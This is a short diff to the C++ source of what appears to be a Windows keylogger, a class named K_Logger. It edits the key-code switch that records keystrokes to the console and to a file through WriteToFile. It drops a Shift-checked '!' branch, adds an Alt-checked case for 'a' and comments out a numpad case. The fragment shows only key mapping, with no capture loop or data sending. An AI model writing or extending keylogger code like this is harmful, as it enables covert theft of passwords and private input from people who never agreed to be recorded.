@@ -1,6 +1,5 @@
 #include "basic_func.h"
 
-std::string symbol;
 
 void K_Logger::WriteToFile(LPCSTR text)
 {
@@ -14,15 +13,6 @@ int K_Logger::SaveSymbol(WORD iKey)
 {
 	switch (iKey)
 	{
-
-	case 33:
-		if (GetAsyncKeyState(0xA0))
-		{
-			symbol += "!";
-			std::cout << "!";
-			WriteToFile("!");
-		}
-
 		case 48:
 			std::cout << "0";
 			WriteToFile("0");
@@ -287,6 +277,13 @@ int K_Logger::SaveSymbol(WORD iKey)
 			}
 			break;
 
+		case 97:
+			if (GetAsyncKeyState(0xA4))
+			{
+				std::cout << "a";
+			}
+			break;
+
 
 		case 0x70:
 			std::cout << "  *F1*  ";
@@ -373,10 +370,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("0");
 			break;
 
-		case 0x61:
+		/*case 0x61:
 			std::cout << "1";
 			WriteToFile("1");
-			break;
+			break;*/
 
 		case 0x62:
 			std::cout << "2";
